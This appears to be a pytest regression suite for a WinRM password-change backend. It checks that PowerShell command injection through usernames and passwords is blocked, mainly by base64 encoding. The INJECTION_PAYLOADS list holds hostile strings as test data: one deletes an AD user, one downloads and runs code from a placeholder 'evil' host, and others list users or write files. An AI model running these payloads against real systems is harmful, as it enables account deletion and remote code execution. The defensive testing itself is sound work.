"""The injection regression suite for the WinRM backend.

Version 1 built this string and handed it to an SSH exec_command:

    "Set-AdAccountPassword -Identity " + user + " -OldPassword ..."

so a username of ``x; Remove-ADUser -Identity ceo -Confirm:$false`` ran as the
service account. These tests pin the properties that make that impossible.
"""

from __future__ import annotations

import base64
import json

import pytest

winrm = pytest.importorskip("winrm")

from app.backends.winrm_backend import _BASE64_RE, WinRmBackend, _encode  # noqa: E402
from app.config import WinRmConfig  # noqa: E402
from app.errors import (  # noqa: E402
    AccountUnusable,
    AuthenticationFailed,
    BackendUnavailable,
    PolicyRejected,
)

CONFIG = WinRmConfig(
    endpoint="https://adtools.example.com:5986/wsman",
    username="CORP\\svc-sspr",
    password="service-secret",
)

INJECTION_PAYLOADS = [
    "x; Remove-ADUser -Identity ceo -Confirm:$false",
    "jdoe`n Get-ADUser -Filter *",
    "jdoe' ; iex (New-Object Net.WebClient).DownloadString('http://evil/') #",
    "$(whoami)",
    "jdoe & calc.exe",
    "jdoe | Out-File C:\\pwn.txt",
]


class _Response:
    def __init__(self, payload: dict, status_code: int = 0):
        self.std_out = json.dumps(payload).encode()
        self.std_err = b""
        self.status_code = status_code


def _capture_script(monkeypatch) -> list[str]:
    scripts: list[str] = []

    class _Session:
        def __init__(self, *a, **kw):
            pass

        def run_ps(self, script):
            scripts.append(script)
            return _Response({"status": "ok", "code": "changed"})

    monkeypatch.setattr(winrm, "Session", _Session)
    return scripts


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_malformed_usernames_are_rejected_before_the_wire(payload, monkeypatch):
    scripts = _capture_script(monkeypatch)
    with pytest.raises(AuthenticationFailed):
        WinRmBackend(CONFIG).change_password(
            username=payload, old_password="a", new_password="b"
        )
    assert scripts == []


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_payloads_in_passwords_never_appear_as_powershell_syntax(payload, monkeypatch):
    scripts = _capture_script(monkeypatch)
    WinRmBackend(CONFIG).change_password(
        username="jdoe", old_password=payload, new_password=payload
    )
    script = scripts[0]
    # The raw payload is nowhere in the script; only its base64 form is.
    assert payload not in script
    assert base64.b64encode(payload.encode()).decode() in script


def test_every_interpolated_value_is_pure_base64(monkeypatch):
    scripts = _capture_script(monkeypatch)
    WinRmBackend(CONFIG).change_password(
        username="jdoe",
        old_password="Old`$(evil)'\"|&;\n",
        new_password="New`$(evil)'\"|&;\n",
    )
    script = scripts[0]
    # Each placeholder was replaced by something drawn only from the base64
    # alphabet, which contains no PowerShell metacharacter.
    quoted = [
        line.split("FromBase64String('")[1].split("')")[0]
        for line in script.splitlines()
        if "FromBase64String('" in line
    ]
    assert len(quoted) == 3
    for value in quoted:
        assert _BASE64_RE.fullmatch(value), value


def test_plaintext_password_is_not_in_the_command_text(monkeypatch):
    """v1 put the password on the Windows command line as -AsPlainText <pw>."""
    scripts = _capture_script(monkeypatch)
    WinRmBackend(CONFIG).change_password(
        username="jdoe", old_password="hunter2-OLD", new_password="hunter2-NEW"
    )
    assert "hunter2-OLD" not in scripts[0]
    assert "hunter2-NEW" not in scripts[0]


def test_unicode_passwords_round_trip():
    assert base64.b64decode(_encode("Paßwörd-Ünïcode-9")).decode() == "Paßwörd-Ünïcode-9"


def _backend_returning(monkeypatch, payload: dict, status_code: int = 0):
    class _Session:
        def __init__(self, *a, **kw):
            pass

        def run_ps(self, script):
            return _Response(payload, status_code)

    monkeypatch.setattr(winrm, "Session", _Session)
    return WinRmBackend(CONFIG)


def test_success_only_when_the_dc_confirms(monkeypatch):
    backend = _backend_returning(monkeypatch, {"status": "ok", "code": "changed"})
    backend.change_password(username="jdoe", old_password="a", new_password="b")


@pytest.mark.parametrize(
    "code,detail,expected",
    [
        ("account_locked", "", AccountUnusable),
        ("account_disabled", "", AccountUnusable),
        ("ADIdentityNotFoundException", "", AuthenticationFailed),
        ("ADException", "The specified network password is not correct", AuthenticationFailed),
        ("ADPasswordComplexityException", "", PolicyRejected),
        ("ADException", "password does not meet the length, complexity, or history requirement", PolicyRejected),
    ],
)
def test_error_classification(monkeypatch, code, detail, expected):
    backend = _backend_returning(
        monkeypatch, {"status": "error", "code": code, "detail": detail}
    )
    with pytest.raises(expected):
        backend.change_password(username="jdoe", old_password="a", new_password="b")


def test_unparseable_output_is_a_backend_failure_not_a_success(monkeypatch):
    class _Session:
        def __init__(self, *a, **kw):
            pass

        def run_ps(self, script):
            response = _Response({})
            response.std_out = b"At line:1 char:1 ... CategoryInfo: InvalidData"
            return response

    monkeypatch.setattr(winrm, "Session", _Session)
    with pytest.raises(BackendUnavailable):
        WinRmBackend(CONFIG).change_password(
            username="jdoe", old_password="a", new_password="b"
        )
